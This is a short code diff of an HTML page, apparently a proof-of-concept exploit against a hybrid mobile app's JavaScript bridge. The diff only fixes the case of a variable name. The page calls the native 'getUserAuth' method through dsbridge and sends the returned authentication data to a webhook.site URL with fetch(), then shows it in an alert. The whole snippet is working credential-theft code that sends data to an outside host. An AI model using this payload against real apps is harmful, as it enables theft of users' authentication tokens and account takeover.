@@ -1,7 +1,7 @@
 <script src="https://cdn.jsdelivr.net/npm/dsbridge@3.1.4/dist/dsbridge.js"></script>
 
 <script>
-    const bridge = window._dsBridge;
+    const bridge = window._dsbridge;
     bridge.call("getUserAuth", {}, function(resp){
         fetch("https://webhook.site/767aff36-7e40-4fb5-ae1a-93431ada5cab?data=" + encodeURIComponent(resp));
         alert("data:" + JSON.stringify(resp));
